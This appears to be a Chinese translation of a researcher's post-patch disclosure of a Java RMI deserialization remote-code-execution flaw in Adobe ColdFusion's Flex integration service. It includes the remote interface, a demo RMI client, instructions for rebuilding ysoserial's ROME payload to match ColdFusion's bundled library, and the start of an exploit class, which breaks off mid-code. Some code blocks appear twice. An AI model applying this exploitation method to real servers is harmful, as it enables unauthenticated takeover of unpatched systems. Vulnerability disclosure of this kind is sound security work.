原文：
2017年10月，我发布了一篇介绍影响Adobe ColdFusion Flex集成服务的[Java
RMI/反序列化漏洞的概述性文章](https://nickbloor.co.uk/2017/10/13/adobe-coldfusion-deserialization-rce-cve-2017-11283-cve-2017-11238/ "Java
RMI/反序列化漏洞的概述性文章")以及相应的概念验证视频。由于本人发现有些漏洞利用代码对于已经打过补丁的服务器来说仍然奏效，因此，当时并没有公布完整的漏洞细节和漏洞利用代码。
令人欣慰的是，Adobe已经[再次更新](https://helpx.adobe.com/security/products/coldfusion/apsb18-14.html
"再次更新")了该软件，所以，现在终于可以将这个漏洞的所有细节公之于众了。
**RMI 与 java.lang.Object**
* * *
众所周知，Java远程方法调用（RMI）协议几乎是纯[Java序列化](https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
"Java序列化")的方式实现的——当我们从RMI注册表服务那里请求对象，并调用该对象的方法时，通过网络传输的数据都将采用Java序列化格式。例如，ColdFusion的Flex集成的RMI服务公开了如下所示的类的一个对象：
    coldfusion.flex.rmi.DataServicesCFProxy
这个类位于ColdFusion安装目录下的“libs/cfusion.jar”文件中，具体代码如下所示：
    package coldfusion.flex.rmi;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.util.List;
    import java.util.Map;
    public abstract interface DataServicesCFProxy extends Remote
    {
      public abstract List fill(String paramString, Object[] paramArrayOfObject, Map paramMap) throws RemoteException;
      public abstract List sync(String paramString, List paramList, Map paramMap) throws RemoteException;
      public abstract Object get(String paramString, Map paramMap1, Map paramMap2) throws RemoteException;
      public abstract Integer count(String paramString, Object[] paramArrayOfObject, Map paramMap) throws RemoteException;
      public abstract boolean fillContains(String paramString, Object[] paramArrayOfObject, Object paramObject, Boolean paramBoolean, Map paramMap) throws RemoteException;
    }
    package coldfusion.flex.rmi;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.util.List;
    import java.util.Map;
    public abstract interface DataServicesCFProxy extends Remote
    {
      public abstract List fill(String paramString, Object[] paramArrayOfObject, Map paramMap) throws RemoteException;
      public abstract List sync(String paramString, List paramList, Map paramMap) throws RemoteException;
      public abstract Object get(String paramString, Map paramMap1, Map paramMap2) throws RemoteException;
      public abstract Integer count(String paramString, Object[] paramArrayOfObject, Map paramMap) throws RemoteException;
      public abstract boolean fillContains(String paramString, Object[] paramArrayOfObject, Object paramObject, Boolean paramBoolean, Map paramMap) throws RemoteException;
    }
对于上面的每个方法来说，都可以将任意的Java对象作为参数来进行调用。需要注意的是，诸如List和Map之类的容器，是可以包含任意的Java对象的。问题在于，由于我们无需身份验证即可与该RMI服务进行交互，所以，任何能通过网络访问该服务的人，都可以向其提供二进制形式的Java对象，这样就有机会发动Java反序列化攻击了（例如，以方法参数的形式提供[ysoserial](https://github.com/frohoff/ysoserial
"ysoserial")的有效载荷）。
不幸的是，所有的ysoserial有效载荷在这里都无法正常使用。
之前，我在关于ColdFusion
CVE-2017-11283和CVE-2017-11284的文章中，曾经介绍过如何修改ysoserial有效载荷来成功利用该入口点，以及如何使用Mozilla
Rhino
JavaScript库来远程执行命令。就本文而言，采用的技术和入口点跟前面的文章中的都是一样的，但目标却变成了与ColdFusion捆绑在一起的[ROME库](https://rometools.github.io/rome/
"ROME库")（具体参见“libs/rome-cf.jar”）。
**漏洞利用方法——简易方式**
* * *
下面的代码是一个简单的RMI客户端程序，它从RMI注册表服务获取ColdFusion
DataServicesCFProxy对象，然后调用远程的count()方法，注意该方法的参数为null：
    package nb.barmie.demo; 
    import coldfusion.flex.rmi.DataServicesCFProxy;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class CFRMIDemo {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        DataServicesCFProxy obj = (DataServicesCFProxy)reg.lookup("cfassembler/default");
        obj.count(null, null, null);
      }
    }
    package nb.barmie.demo;
    import coldfusion.flex.rmi.DataServicesCFProxy;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class CFRMIDemo {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        DataServicesCFProxy obj = (DataServicesCFProxy)reg.lookup("cfassembler/default");
        obj.count(null, null, null);
      }
    }
count()方法的第二个参数是一个java.lang.Object数组，这意味着我们可以在该参数中提供二进制形式的对象，并且这些对象将在服务器上进行反序列化处理。我们可以在运行时通过ysoserial生成一个二进制形式的有效载荷对象，并将其传递给count()方法，但是，ysoserial的ROME有效载荷与ColdFusion捆绑的ROME版本无法兼容。所以，当我们尝试这种方法时，服务器会指出服务器端的类与通过网络发送的序列化对象不兼容。之所以出现这种情况，主要是serialVersionUID字段不匹配所致。
在2018年4月推出新的更新之前，利用ColdFusion
RMI服务漏洞的最简单方法是重新构建ysoserial。具体来说，就是利用ColdFusion安装目录中的“libs/rome-cf.jar”来构建ysoserial，而不是使用rome 1.0（Maven的依赖项）。完成上述工作后，就可以使用以下代码来生成和投递有效载荷了：
    package nb.barmie.exploit.standalone;
    import coldfusion.flex.rmi.DataServicesCFProxy;
    import ysoserial.payloads.ROME;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class CFRMIExploit {
      public static void main(String[] args) throws Exception {
        Registry reg = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        DataServicesCFProxy obj = (DataServicesCFProxy)reg.lookup("cfassembler/default");